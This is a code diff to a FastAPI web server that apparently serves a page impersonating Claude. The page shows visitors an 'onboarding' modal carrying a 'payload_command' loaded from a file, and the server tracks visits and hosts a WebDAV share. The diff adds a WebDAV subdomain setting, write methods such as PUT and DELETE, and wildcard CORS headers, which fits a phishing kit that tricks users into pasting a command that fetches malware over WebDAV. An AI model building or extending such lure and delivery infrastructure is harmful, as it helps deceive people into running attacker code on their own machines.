@@ -134,10 +134,18 @@ async def root():
 async def claude_page(request: Request):
     modal_template = config.get("modal_template", "onboarding_template.html")
     payload_cmd = load_payload().strip()
+    webdav_subdomain = config.get("webdav", {}).get("subdomain", request.url.hostname)
+    
     return templates.TemplateResponse(
         request, 
         config.get("template"), 
-        {"request": request, "domain": request.url.hostname, "modal_template": modal_template, "payload_command": payload_cmd}
+        {
+            "request": request, 
+            "domain": request.url.hostname, 
+            "modal_template": modal_template, 
+            "payload_command": payload_cmd,
+            "webdav_subdomain": webdav_subdomain
+        }
     )
 
 @app.post("/api/track")
@@ -153,9 +161,25 @@ async def options_root():
     headers = {
         "DAV": "1, 2",
         "MS-Author-Via": "DAV",
-        "Allow": "OPTIONS, GET, HEAD, POST, PROPFIND, PROPPATCH",
+        "Allow": "OPTIONS, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, DELETE, PUT, COPY, MOVE",
+        "Access-Control-Allow-Origin": "*",
+        "Access-Control-Allow-Methods": "GET, POST, OPTIONS, PROPFIND, PROPPATCH, MKCOL, DELETE, PUT, COPY, MOVE",
+        "Access-Control-Allow-Headers": "Content-Type, Depth, User-Agent, Translate, Overwrite, Destination, Lock-Token, If, Lock-Token, Timeout, X-Requested-With",
+        "Access-Control-Expose-Headers": "DAV, MS-Author-Via",
     }
     return Response(status_code=200, headers=headers)
+
+# CORS middleware for WebDAV
+@app.middleware("http")
+async def webdav_cors(request: Request, call_next):
+    response = await call_next(request)
+    if "/dav" in request.url.path:
+        response.headers["Access-Control-Allow-Origin"] = "*"
+        response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS, PROPFIND, PROPPATCH, MKCOL, DELETE, PUT, COPY, MOVE"
+        response.headers["Access-Control-Allow-Headers"] = "*"
+        response.headers["DAV"] = "1, 2"
+        response.headers["MS-Author-Via"] = "DAV"
+    return response
 # ====================== START ======================
 if __name__ == "__main__":
     server_cfg = config.get("server", {})
